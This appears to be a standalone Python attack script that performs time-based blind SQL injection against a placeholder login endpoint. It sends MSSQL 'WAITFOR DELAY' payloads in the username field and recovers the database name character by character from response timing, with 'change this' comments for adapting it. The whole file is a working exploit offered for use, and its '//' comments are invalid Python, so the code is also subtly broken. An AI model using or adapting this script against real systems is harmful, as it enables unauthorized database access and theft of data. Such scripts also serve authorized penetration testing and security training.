import requests
import time

url = "http://<target>/login"
charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def check(payload):
    data = {"username": payload, "password": "test"} //change this
    start = time.time()
    requests.post(url, data=data)
    return time.time() - start > 5  # True if delayed

# Extract DB name character by character
result = ""
for position in range(1, 20):
    for char in charset:
        payload = f"' IF (SUBSTRING(db_name(),{position},1)='{char}') WAITFOR DELAY '0:0:5'--" //change this to relevant sql product
        if check(payload):
            result += char
            print(f"Found: {result}")
            break
